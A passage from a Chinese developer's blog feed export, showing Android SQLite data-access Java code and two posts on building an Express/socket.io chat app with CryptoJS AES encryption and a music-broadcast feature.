temp.setPhone_type(cursor.getString(cursor.getColumnIndex(&quot;phone_type&quot;)));</div><div class="line">            temp.setSet_or_not(cursor.getString(cursor.getColumnIndex(&quot;set_or_not&quot;)));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public mem FindMemById(int i)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where mem_id=?&quot;,new String[]&#123;i+&quot;&quot;&#125;);</div><div class="line">        mem temp=new mem();</div><div class="line">        cursor.moveToFirst();</div><div class="line">        temp.setMem_id(cursor.getInt(0));</div><div class="line">        temp.setName(cursor.getString(1));</div><div class="line">        temp.setPhone_num(cursor.getString(2));</div><div class="line">        temp.setPhone_type(cursor.getString(3));</div><div class="line">        temp.setSet_or_not(cursor.getString(4));</div><div class="line">        localDatabase.close();</div><div class="line">        return temp;</div><div class="line">    &#125;</div><div class="line">    public List&lt;mem&gt; FindMemByName(String name)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where name=?&quot;,new String[]&#123;name&#125;);</div><div class="line">        List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">        while(cursor.moveToNext()) &#123;</div><div class="line">            mem temp=new mem();</div><div class="line">            temp.setMem_id(cursor.getInt(0));</div><div class="line">            temp.setName(cursor.getString(1));</div><div class="line">            temp.setPhone_num(cursor.getString(2));</div><div class="line">            temp.setPhone_type(cursor.getString(3));</div><div class="line">            temp.setSet_or_not(cursor.getString(4));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public List&lt;mem&gt; FindMemByPhone_num(String phone_num)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where phone_num=?&quot;,new String[]&#123;phone_num&#125;);</div><div class="line">        List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">        while(cursor.moveToNext()) &#123;</div><div class="line">            mem temp=new mem();</div><div class="line">            temp.setMem_id(cursor.getInt(0));</div><div class="line">            temp.setName(cursor.getString(1));</div><div class="line">            temp.setPhone_num(cursor.getString(2));</div><div class="line">            temp.setPhone_type(cursor.getString(3));</div><div class="line">            temp.setSet_or_not(cursor.getString(4));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public List&lt;mem&gt; FindMemByPhone_type(String phone_type)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where phone_type=?&quot;,new String[]&#123;phone_type&#125;);</div><div class="line">        List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">        while(cursor.moveToNext()) &#123;</div><div class="line">            mem temp=new mem();</div><div class="line">            temp.setMem_id(cursor.getInt(0));</div><div class="line">            temp.setName(cursor.getString(1));</div><div class="line">            temp.setPhone_num(cursor.getString(2));</div><div class="line">            temp.setPhone_type(cursor.getString(3));</div><div class="line">            temp.setSet_or_not(cursor.getString(4));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public List&lt;mem&gt; FindMemBySet_or_not(String set_or_not)&#123;</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from mem_table where set_or_not=?&quot;,new String[]&#123;set_or_not&#125;);</div><div class="line">        List&lt;mem&gt;arr=new ArrayList&lt;mem&gt;();</div><div class="line">        while(cursor.moveToNext()) &#123;</div><div class="line">            mem temp=new mem();</div><div class="line">            temp.setMem_id(cursor.getInt(0));</div><div class="line">            temp.setName(cursor.getString(1));</div><div class="line">            temp.setPhone_num(cursor.getString(2));</div><div class="line">            temp.setPhone_type(cursor.getString(3));</div><div class="line">            temp.setSet_or_not(cursor.getString(4));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public void modify_mem(mem x)&#123;</div><div class="line">        Object[] arr=new Object[5];</div><div class="line">        SQLiteDatabase localDatabase=this.mem_dbHelper.getWritableDatabase();</div><div class="line">        arr[0]=x.getName();</div><div class="line">        arr[1]=x.getPhone_num();</div><div class="line">        arr[2]=x.getPhone_type();</div><div class="line">        arr[3]=x.getSet_or_not();</div><div class="line">        arr[4]=x.getMem_id()+&quot;&quot;;</div><div class="line">        try &#123;</div><div class="line">            localDatabase.execSQL(&quot;update mem_table set name=?,phone_num=?, phone_type=?, set_or_not=? where mem_id=?&quot;, arr);</div><div class="line">        &#125;</div><div class="line">        catch (Exception e)&#123;</div><div class="line">            add_mem(x);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">DB_all_Server.java:</div><div class="line"></div><div class="line">package com.haocong.test;</div><div class="line">import java.util.List;</div><div class="line">import java.util.ArrayList;</div><div class="line">import android.database.sqlite.SQLiteDatabase;</div><div class="line">import android.database.Cursor;</div><div class="line">import android.content.Context;</div><div class="line">import android.util.Log;</div><div class="line">/**</div><div class="line"> * Created by Dell-User on 2017/6/11.</div><div class="line"> */</div><div class="line"></div><div class="line">public class DB_all_Server &#123;</div><div class="line">    private DB_all_Helper db_all_helper;</div><div class="line">    public DB_all_Server(Context context)&#123;</div><div class="line">        this.db_all_helper=new DB_all_Helper(context);</div><div class="line">    &#125;</div><div class="line">    public void add_bwl(bwl_instance bwl)&#123;</div><div class="line">//        private String info_id;</div><div class="line">//        private  String info;</div><div class="line">//        private String rem_time;</div><div class="line">//        private String importance;</div><div class="line">//        private String time;</div><div class="line">//        private String type;</div><div class="line">        Object[] arr=new Object[5];</div><div class="line">        arr[0]=bwl.getInfo();</div><div class="line">        arr[1]=bwl.getRem_time();</div><div class="line">        arr[2]=bwl.getImportance();</div><div class="line">        arr[3]=bwl.getTime();</div><div class="line">        arr[4]=bwl.getType();</div><div class="line">        SQLiteDatabase localDatebase=this.db_all_helper.getWritableDatabase();</div><div class="line">        localDatebase.execSQL(&quot;insert into Bw_info_table(info_id, info,rem_time,importance,time,type) values(null,?,?,?,?,?)&quot;,arr);</div><div class="line">        localDatebase.close();</div><div class="line">    &#125;</div><div class="line">    public void delete_bwl_by_id(int id)&#123;</div><div class="line">//        private String info_id;</div><div class="line">//        private  String info;</div><div class="line">//        private String rem_time;</div><div class="line">//        private String importance;</div><div class="line">//        private String time;</div><div class="line">//        private String type;</div><div class="line">        SQLiteDatabase localDatebase=this.db_all_helper.getWritableDatabase();</div><div class="line">        localDatebase.execSQL(&quot;delete from Bw_info_table where info_id =?&quot;, new String[]&#123;&quot;&quot;+id&#125;);</div><div class="line">        localDatebase.close();</div><div class="line">    &#125;</div><div class="line">    public bwl_instance find_bwl_by_id(int id)&#123;</div><div class="line">//        private String info_id;</div><div class="line">//        private  String info;</div><div class="line">//        private String rem_time;</div><div class="line">//        private String importance;</div><div class="line">//        private String time;</div><div class="line">//        private String type;</div><div class="line">        SQLiteDatabase localDatabase=this.db_all_helper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from Bw_info_table where info_id=?&quot;,new String[]&#123;&quot;&quot;+id&#125;);</div><div class="line">        cursor.moveToFirst();</div><div class="line">            bwl_instance temp=new bwl_instance();</div><div class="line">            temp.setInfo_id(cursor.getInt(0));</div><div class="line">            temp.setInfo(cursor.getString(cursor.getColumnIndex(&quot;info&quot;)));</div><div class="line">            temp.setRem_time(cursor.getString(cursor.getColumnIndex(&quot;rem_time&quot;)));</div><div class="line">            temp.setImportance(cursor.getString(cursor.getColumnIndex(&quot;importance&quot;)));</div><div class="line">            temp.setTime(cursor.getString(cursor.getColumnIndex(&quot;time&quot;)));</div><div class="line">            temp.setType(cursor.getString(cursor.getColumnIndex(&quot;type&quot;)));</div><div class="line">        localDatabase.close();</div><div class="line">        return temp;</div><div class="line">    &#125;</div><div class="line">    public List&lt;bwl_instance&gt; get_bwl()&#123;</div><div class="line">        List&lt;bwl_instance&gt;arr=new ArrayList&lt;bwl_instance&gt;();</div><div class="line">        SQLiteDatabase locatDatabase=this.db_all_helper.getReadableDatabase();</div><div class="line">        Cursor cursor=locatDatabase.rawQuery(&quot;select * from Bw_info_table where 1=1  &quot;,null);</div><div class="line">        while(cursor.moveToNext())&#123;</div><div class="line">            if(cursor.getString(cursor.getColumnIndex(&quot;type&quot;)).equals(&quot;定位记录&quot;))&#123;</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line">            bwl_instance temp=new bwl_instance();</div><div class="line">            temp.setInfo_id(cursor.getInt(cursor.getColumnIndex(&quot;info_id&quot;)));</div><div class="line">            temp.setInfo(cursor.getString(cursor.getColumnIndex(&quot;info&quot;)));</div><div class="line">            temp.setRem_time(cursor.getString(cursor.getColumnIndex(&quot;rem_time&quot;)));</div><div class="line">            temp.setImportance(cursor.getString(cursor.getColumnIndex(&quot;importance&quot;)));</div><div class="line">            temp.setTime(cursor.getString(cursor.getColumnIndex(&quot;time&quot;)));</div><div class="line">            temp.setType(cursor.getString(cursor.getColumnIndex(&quot;type&quot;)));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        locatDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">    public List&lt;bwl_instance&gt; find_bwl_by_type(String type)&#123;</div><div class="line">//        private String info_id;</div><div class="line">//        private  String info;</div><div class="line">//        private String rem_time;</div><div class="line">//        private String importance;</div><div class="line">//        private String time;</div><div class="line">//        private String type;</div><div class="line">        List&lt;bwl_instance&gt;arr=new ArrayList&lt;bwl_instance&gt;();</div><div class="line">        SQLiteDatabase localDatabase=this.db_all_helper.getReadableDatabase();</div><div class="line">        Cursor cursor=localDatabase.rawQuery(&quot;select * from Bw_info_table where type=?&quot;,new String[]&#123;type&#125;);</div><div class="line">        while(cursor.moveToNext())&#123;</div><div class="line">            bwl_instance temp=new bwl_instance();</div><div class="line">            temp.setInfo_id(cursor.getInt(cursor.getColumnIndex(&quot;info_id&quot;)));</div><div class="line">            temp.setInfo(cursor.getString(cursor.getColumnIndex(&quot;info&quot;)));</div><div class="line">            temp.setRem_time(cursor.getString(cursor.getColumnIndex(&quot;rem_time&quot;)));</div><div class="line">            temp.setImportance(cursor.getString(cursor.getColumnIndex(&quot;importance&quot;)));</div><div class="line">            temp.setTime(cursor.getString(cursor.getColumnIndex(&quot;time&quot;)));</div><div class="line">            temp.setType(cursor.getString(cursor.getColumnIndex(&quot;type&quot;)));</div><div class="line">            arr.add(temp);</div><div class="line">        &#125;</div><div class="line">        localDatabase.close();</div><div class="line">        return arr;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p>本安卓项目将开源到github上(暂时为测试版本，可能会有一些bug或不尽人意之处，会在下一个版本完善)，另，各位小伙伴有任何问题可以在下方留言，我会及时解答或订正<br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> Android实战笔记 </category>
            
            <category> 一个人的数据库实训 </category>
            
            <category> 多线程子模块的应用 </category>
            
            <category> 安卓传感器的应用 </category>
            
            <category> 高德地图定位 </category>
            
            <category> 创意小app </category>
            
        </categories>
        
        
        <tags>
            
            <tag> AndroidSQLite简单应用 </tag>
            
            <tag> 安卓传感器的运用 </tag>
            
            <tag> GPS定位 </tag>
            
            <tag> 线性加速度传感器 </tag>
            
            <tag> SMS功能 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Node.js+Express/socket.io，有点创意的动态即时聊天系统(下)]]></title>
      <url>http://yikunhaocong.com/2017/04/30/node-js-chat2/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>总结一下开发中的问题&amp;解决方法(接上一篇博文)<p></p>
<a id="more"></a>
<h2 id="开发中的问题-amp-解决方法"><a href="#开发中的问题-amp-解决方法" class="headerlink" title="开发中的问题&amp;解决方法"></a>开发中的问题&amp;解决方法</h2><h3 id="第一个是多个界面的切换"><a href="#第一个是多个界面的切换" class="headerlink" title="第一个是多个界面的切换"></a>第一个是多个界面的切换</h3><blockquote>
<p>解决方法很粗暴，直接用display:”none”和display:”block”实现动态切换与隐藏，不过多个界面的切换逻辑要先理清楚，由于我的这个页面比较简单，通过这种方式实现是最简单的切换(无需费时)，建议是把各类界面的切换函数封装起来，以便于减少代码量和方便使用。比如我4个界面只需要用下面简短的四个函数就可以实现<br><a href="http://op72m4y17.bkt.clouddn.com/44.png" target="_blank" rel="external"></a></p>
</blockquote>
<h3 id="第二个是加密-解密的实现"><a href="#第二个是加密-解密的实现" class="headerlink" title="第二个是加密/解密的实现"></a>第二个是加密/解密的实现</h3><blockquote>
<p>通常node.js里面可以直接require(‘crypto’)模块来直接使用加密api,但如果要嵌入网页的话，采取”script”标签方式是无法使用require方法的，除非你先导入require.js(先去搜索再下载)，再进行一下各种配置，但我不建议采用这种方法。我的解决方法是找到crypto对应的网页js包–CryptoJS，然后把需要用到的js文件导入(可能有不同依赖，需要先确认好再完整导入)，然后就可以在chat.js里面调用函数或重载一下使加密/解密过程得以在通讯中实现。<br>特别要记得按顺序导入如下图，否则加密过程中会出现Parse、Cipher创建等一系列未知的错误。<br><img src="http://op72m4y17.bkt.clouddn.com/22.png" alt="按这个顺序导入"></p>
<ul>
<li>这里友情提供CrytoJS包下载链接<a href="https://code.google.com/archive/p/crypto-js/downloads" target="_blank" rel="external">https://code.google.com/archive/p/crypto-js/downloads</a>，具体怎么用请看谷歌教程<a href="https://code.google.com/archive/p/crypto-js/" target="_blank" rel="external">https://code.google.com/archive/p/crypto-js/</a></li>
</ul>
</blockquote>
<h3 id="第三个是音乐库的导入"><a href="#第三个是音乐库的导入" class="headerlink" title="第三个是音乐库的导入"></a>第三个是音乐库的导入</h3><blockquote>
<p>我在前面说了我是直接找到网易云音乐的外链播放器的id嵌入到网页的，这种方法很麻烦(需要自己去找对应的歌曲id再放进去)，刚开始我是写了一个python爬虫爬取id但失败了(可能是cookie认证或者网站的反爬虫机制绕不过，但我没有过多尝试，但我觉得真正要实现应该不难(需要研究一下，就比如之前模拟登录爬取数据一样，一定会有方法可以实现)，所以我会考虑在下一个版本中实现这种方法，我最想做的事就是跨语言开发，利用自己比较熟悉python的优势以及python在数据方面处理的优秀能力与node.js结合，一定会有很强大的威力。<br>至于python如何嵌入到node.js,很简单，用node.js开个新进程，运行py文件，然后以控制台输入输出的形式来获取python文件运行后的数据，实现两种语言的交互。<br><img src="http://op72m4y17.bkt.clouddn.com/4.png" alt="暂时导入网易云音乐的静态接口，下一个迭代版本将采用python爬虫+node.js搜索导入url接口"></p>
</blockquote>
<h3 id="第四个是管理员广播音乐的轮换"><a href="#第四个是管理员广播音乐的轮换" class="headerlink" title="第四个是管理员广播音乐的轮换"></a>第四个是管理员广播音乐的轮换</h3><blockquote>
<p>最终想了个差强人意的解决方法，利用socket.emit(‘text’,from,msg)发送信息的过程来顺便进行音乐广播，当前管理员点歌之后，再发一条信息就能将这首歌广播出去(其他用户将同时在这个时刻播放与管理员相同的曲目)。在新用户连接进来时，会直接播放当前已点的歌曲(但手机浏览器是切换到了这首歌，但要不要播放取决于用户)。当管理员断开连接后，新加入的用户会变成新的音乐管理员(dj)，然后可以进行歌曲的广播(点歌动作发生后)。在这整个过程中，如果管理员没有点歌的话，用户是可以随时选择听自己喜欢的歌曲。<br><img src="http://op72m4y17.bkt.clouddn.com/2.png" alt=""></p>
<h3 id="还有清屏、解密转换等小问题就不赘言了"><a href="#还有清屏、解密转换等小问题就不赘言了" class="headerlink" title="还有清屏、解密转换等小问题就不赘言了"></a>还有清屏、解密转换等小问题就不赘言了</h3></blockquote>
<h2 id="最后再附上自己在打这个聊天项目前打的一个灰常简单的基于TCP的即时通讯cmd窗口"><a href="#最后再附上自己在打这个聊天项目前打的一个灰常简单的基于TCP的即时通讯cmd窗口" class="headerlink" title="最后再附上自己在打这个聊天项目前打的一个灰常简单的基于TCP的即时通讯cmd窗口"></a>最后再附上自己在打这个聊天项目前打的一个灰常简单的基于TCP的即时通讯cmd窗口</h2><p><img src="http://op72m4y17.bkt.clouddn.com/tcp.png" alt="代码目录"></p>
<blockquote>
<p>不需要导入任何模块，聊天效果图如下<br>通过telnet连接到服务器<br><img src="http://op72m4y17.bkt.clouddn.com/tcp1.png" alt=""><br>以冒号隔开用户名和加密秘钥(这里采取括号形式结束输入)由于telnet传输是立刻传输的，所以这里需要有个结束符号’)’<br><img src="http://op72m4y17.bkt.clouddn.com/tcp2.png" alt=""><br>可以看到输入的三句英文都以Aes-128-cbc加密后的字符串输出，其它用户用(*密码)的形式可以对具有这个密码的所有用户所发的信息进行解密！<br><img src="http://op72m4y17.bkt.clouddn.com/tcp3.png" alt=""><br>自定义服务器后台监控&amp;输出<br><img src="http://op72m4y17.bkt.clouddn.com/tcp4.png" alt="后台监控&amp;输出"></p>
</blockquote>
<h3 id="加密模块"><a href="#加密模块" class="headerlink" title="加密模块"></a>加密模块</h3><blockquote>
<p>分享一下加密模块代码,总共16行，很简短，加密向量默认为iv=’5683022032017422’<br><img src="http://op72m4y17.bkt.clouddn.com/jm.png" alt="Aes-128-cbc加密代码"></p>
</blockquote>
<ul>
<li>Tcp_chat服务器代码就不分享了，比较简单，主要用了net模块(比http模块更底层的网络模块)，代码里大部分是自定义的服务器后端监控&amp;输出(代码量超过基于socket.io的聊天网页)，可见socket.io模块的强大。</li>
</ul>
<blockquote>
<p>《基于Node.js框架和Express/socket.io的动态即时聊天系统》这两篇博文仅用于分享开发经验和整理node.js笔记，该项目已开源至<a href="https://github.com/Kali-Hac/node_js_chat" target="_blank" rel="external">我的github/node_js_chat项目</a>，有需要可以查阅代码。另：有任何问题的小伙伴可以在评论区留言，我会尽量解答或订正。<br><img src="http://op72m4y17.bkt.clouddn.com/1.jpg" alt=""></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 作者:Hac </category>
            
            <category> Node.js实战笔记 </category>
            
            <category> Node.js网络通讯后台的搭建 </category>
            
            <category> Telnet网络通讯后台的搭建 </category>
            
            <category> JavaScript聊天动态界面的构建 </category>
            
            <category> crypto加密模块的网页嵌入(CryptoJS) </category>
            
            <category> 1.(聊天)信息加密传输/2.获取秘钥解密/3.管理员点歌广播的后台实现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> socket.io </tag>
            
            <tag> express </tag>
            
            <tag> CryptoJS </tag>
            
            <tag> HTTP/WebSocket </tag>
            
            <tag> Aes-128-cbc对称加密 </tag>
            
            <tag> 在线聊天/点歌系统 </tag>
            
            <tag> 通讯加密的应用 </tag>
            
            <tag> 底层TCP即时通讯 </tag>
            
            <tag> Telnet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Node.js+Express/socket.io，有点创意的动态即时聊天系统(上)]]></title>
      <url>http://yikunhaocong.com/2017/04/30/node-js-chat/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>这两天想打一个在线聊天系统，正好最近申了一个项目的后台是基于Node.js构建的，再者可以结合一下自己的前端JavaScript的编程来学习。第一次真正自己构建一个自主js后台，码了很有趣的一个聊天系统，可以1.(聊天)信息加密传输/2.获取秘钥解密/3.管理员点歌广播。<p></p>
<a id="more"></a>
<h2 id="我的Node-js后台实战笔记，前言-amp-分享"><a href="#我的Node-js后台实战笔记，前言-amp-分享" class="headerlink" title="我的Node.js后台实战笔记，前言&amp;分享"></a>我的Node.js后台实战笔记，前言&amp;分享</h2><blockquote>
<p>在这里先强力推荐Guillermo Rauch写的一本书《了不起的Node.js -将JavaScript进行到底》，适合后台新手，抵得过《Node.js for PHP developer》+ 《JavaScript for PHP developer》(这两本书其中一本是一天看完的，可能比较基础，收获较少)。<br>    本次开发是在Guillermo Rauch实战教程的基础上写的，但更多的是自己的探索与实践，例如作者推荐的音乐API Grooveshark无法使用，所以自己导入曲库，之后会继续尝试python爬虫+node.js搜索导入音乐url接口(python和js的优势互补是我最想实现的)；还有聊天加密功能，原实例并没有使用crypto加密模块，为了将加密进行到底，我尝试将CryptoJS嵌入网页并结合后台实现了随时加密解密的传输；对于前端，原实例采用非常简单的空白页面，而我自己构建了一个动态页面(结合bootstrap),并实现了所有前后接口的对接。</p>
<ul>
<li>本博文只简要讲解实现过程，但会对一些比较坑的bug进行具体解释，本项目相应源码将会开源分享到我的github上<a href="https://github.com/Kali-Hac/node_js_chat" target="_blank" rel="external">https://github.com/Kali-Hac/node_js_chat</a>，移动端代码会有所不同，有任何问题或建议可以在后面留言，我会尽量解答和订正。</li>
</ul>
</blockquote>
<h2 id="聊天页面效果图"><a href="#聊天页面效果图" class="headerlink" title="聊天页面效果图"></a>聊天页面效果图</h2><h3 id="基本功能：多人同时聊天"><a href="#基本功能：多人同时聊天" class="headerlink" title="基本功能：多人同时聊天"></a>基本功能：多人同时聊天</h3><p><img src="http://op72m4y17.bkt.clouddn.com/1.png" alt="基本功能：多人同时聊天"><br><img src="http://op72m4y17.bkt.clouddn.com/2.png" alt=""></p>
<h3 id="密文-点歌-返回-清屏-简约的菜单"><a href="#密文-点歌-返回-清屏-简约的菜单" class="headerlink" title="密文/点歌/返回/清屏 简约的菜单"></a>密文/点歌/返回/清屏 简约的菜单</h3><p><img src="http://op72m4y17.bkt.clouddn.com/3.png" alt="密文/点歌/返回/清屏 简约的菜单"></p>
<h3 id="暂时导入网易云音乐的静态接口"><a href="#暂时导入网易云音乐的静态接口" class="headerlink" title="暂时导入网易云音乐的静态接口"></a>暂时导入网易云音乐的静态接口</h3><blockquote>
<p>暂时导入网易云音乐的静态接口，下一个迭代版本将采用python爬虫+node.js搜索导入url接口<br><img src="http://op72m4y17.bkt.clouddn.com/4.png" alt="暂时导入网易云音乐的静态接口，下一个迭代版本将采用python爬虫+node.js搜索导入url接口"></p>
<h3 id="加密页面-Aes-128-cbc"><a href="#加密页面-Aes-128-cbc" class="headerlink" title="加密页面,Aes-128-cbc"></a>加密页面,Aes-128-cbc</h3><p>加密页面，设置16位以内的key，而Aes-128-cbc的iv向量值已给定，为5683022032017430(自己指定)<br><img src="http://op72m4y17.bkt.clouddn.com/5.png" alt="加密页面，设置16位以内的key，而Aes-128-cbc的iv向量值已给定，为5683022032017430(自己指定)"><br><img src="http://op72m4y17.bkt.clouddn.com/6.png" alt=""></p>
<h3 id="设置加密效果"><a href="#设置加密效果" class="headerlink" title="设置加密效果"></a>设置加密效果</h3><p>其它聊天者看到的将会是加密后的密文字符串<br><img src="http://op72m4y17.bkt.clouddn.com/7.png" alt="设置加密后，其它聊天者看到的将会是加密后的密文字符串"><br><img src="http://op72m4y17.bkt.clouddn.com/7.5.png" alt=""></p>
<h3 id="需要加密方告知秘钥才能对内容进行解密，如图："><a href="#需要加密方告知秘钥才能对内容进行解密，如图：" class="headerlink" title="需要加密方告知秘钥才能对内容进行解密，如图："></a>需要加密方告知秘钥才能对内容进行解密，如图：</h3><p><img src="http://op72m4y17.bkt.clouddn.com/8.png" alt=""><br><img src="http://op72m4y17.bkt.clouddn.com/9.png" alt=""></p>
<h3 id="广播音乐功能"><a href="#广播音乐功能" class="headerlink" title="广播音乐功能"></a>广播音乐功能</h3><p>广播点歌采取dj轮流制，当前dj退出后则选举下一个新进的客户作为新dj，点歌后其他所有用户将会听同一首歌(也可以个人在收到广播后另选歌)<br><img src="http://op72m4y17.bkt.clouddn.com/10.png" alt="广播点歌采取dj轮流制，当前dj退出后则选举下一个新进的客户作为新dj，点歌后其他所有用户将会听同一首歌(也可以个人在收到广播后另选歌)"></p>
</blockquote>
<h2 id="我是如何在数天内写出这个聊天系统的？"><a href="#我是如何在数天内写出这个聊天系统的？" class="headerlink" title="我是如何在数天内写出这个聊天系统的？"></a>我是如何在数天内写出这个聊天系统的？</h2><h3 id="前端-后端代码文件一览"><a href="#前端-后端代码文件一览" class="headerlink" title="前端/后端代码文件一览"></a>前端/后端代码文件一览</h3><p><img src="http://op72m4y17.bkt.clouddn.com/11.png" alt="VScode文件目录"></p>
<blockquote>
<p>其中，aes.js/cipher-core.js/core.js/enc-base64.js/lib-typedarrays.js这几个js文件是为了实现页面的aes加密的CrytoJS包，相当于Node.js里面的crypto模块。<br>特别要记得按顺序导入如下图，否则加密过程中会出现Parse、Cipher创建等一系列未知的错误。<br><img src="http://op72m4y17.bkt.clouddn.com/22.png" alt="按这个顺序导入"></p>
<ul>
<li>这里友情提供CrytoJS包下载链接<a href="https://code.google.com/archive/p/crypto-js/downloads" target="_blank" rel="external">https://code.google.com/archive/p/crypto-js/downloads</a>，具体怎么用请看谷歌教程<a href="https://code.google.com/archive/p/crypto-js/" target="_blank" rel="external">https://code.google.com/archive/p/crypto-js/</a></li>
</ul>
<p>add_songs.js/inner.js用于动态加载页面(我的index.html代码量很少，都封装在js里面了，这有利于代码维护)。<br>chat.js就是很重要的客户端文件啦，用于与服务器server.js进行交互的页面js，基本很多功能都在里面实现。</p>
</blockquote>
<ul>
<li>还有package.json中需要安装的npm包(node_modules)，就两个<br><img src="http://op72m4y17.bkt.clouddn.com/33.png" alt="express和socket.io"><br>socket.io是Guillermo Rauch自己写的一个WebSocket重构接口包，非常方便，在这里要膜一下，感觉这个模块很棒</li>
</ul>
<h3 id="后台服务器Server-js代码一览"><a href="#后台服务器Server-js代码一览" class="headerlink" title="后台服务器Server.js代码一览"></a>后台服务器Server.js代码一览</h3><blockquote>
<p>代码非常简单，node.js50-60行已经足以构建一个稳健的服务器了，虽然是单线程的，但有很高效的异步轮询制，对比于传统的php文件+Apache/ngix服务器软件，个人更喜欢node.js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line">var express = require(&apos;express&apos;);</div><div class="line">var sio = require(&apos;socket.io&apos;);</div><div class="line">app = express.createServer(</div><div class="line">    